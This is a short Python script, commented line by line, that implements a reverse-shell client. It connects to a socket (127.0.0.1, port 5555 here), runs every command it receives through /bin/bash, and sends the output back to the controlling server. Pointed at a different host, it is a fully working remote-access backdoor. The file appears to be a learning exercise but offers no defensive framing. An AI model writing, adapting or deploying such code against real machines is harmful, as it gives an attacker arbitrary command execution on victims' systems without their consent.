#!/usr/bin/python3  # Specifies the interpreter to use for running the script

import os  # Imports the os module for interacting with the operating system
import socket  # Imports the socket module for network communication
import subprocess  # Imports the subprocess module to run shell commands

# Create socket
def socket_create():
    try:
        global host  # Declares the host variable as global
        global port  # Declares the port variable as global
        global s  # Declares the socket variable as global
        host = '127.0.0.1'  # Assigns the local IP address as the server IP
        port = 5555  # Assigns a random port number for the connection
        s = socket.socket()  # Creates a socket object
    except socket.error as msg:
        print("Socket creation error: " + str(msg))  # Prints an error message if socket creation fails

# Connect to a remote socket
def socket_connect():
    try:
        global host  # References the global host variable
        global port  # References the global port variable
        global s  # References the global socket variable
        s.connect((host, port))  # Connects to the server using the specified host and port
    except socket.error as msg:
        print("Socket connection error: " + str(msg))  # Prints an error message if connection fails

# Receive commands and run them
def receive_commands():
    global s  # References the global socket variable
    while True:  # Starts an infinite loop to continuously listen for commands
        try:
            data = s.recv(1024)  # Receives up to 1024 bytes of data from the server
            if not data:  # If no data is received, break the loop
                break
            if data[:2].decode("utf-8") == 'cd':  # Checks if the command is to change directory
                try:
                    os.chdir(data[3:].decode("utf-8"))  # Changes the current directory
                    s.send(str.encode(os.getcwd() + '> '))  # Sends the new current directory back to the server
                except FileNotFoundError as e:
                    s.send(str.encode("Directory not found: " + str(e) + '\n'))  # Sends an error message if directory not found
            else:
                cmd = subprocess.Popen(data.decode("utf-8"), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE, executable='/bin/bash')
                # Runs the received command in a new bash shell
                output_bytes = cmd.stdout.read() + cmd.stderr.read()  # Reads the command's output and errors
                output_str = str(output_bytes, "utf-8")  # Converts the output to a string
                s.send(str.encode(output_str + os.getcwd() + '> '))  # Sends the output and current directory back to the server
        except Exception as e:  # Catches any exceptions that occur
            print("Command execution error: " + str(e))  # Prints the exception message
            s.send(str.encode("Command execution error: " + str(e) + '\n'))  # Sends the exception message back to the server
    s.close()  # Closes the socket connection

# Main function to set up and run the server
def main():
    socket_create()  # Calls the function to create a socket
    socket_connect()  # Calls the function to connect to the server
    receive_commands()  # Calls the function to start receiving and executing commands

if __name__ == "__main__":  # Checks if the script is being run directly (not imported as a module)
    try:
        main()  # Runs the main function
    except KeyboardInterrupt:  # Catches a keyboard interrupt (Ctrl+C)
        print("\nConnection closed by user")  # Prints a message indicating the connection was closed by the user
    except Exception as e:  # Catches any other exceptions that occur
        print(f"An error occurred: {e}")  # Prints the exception message
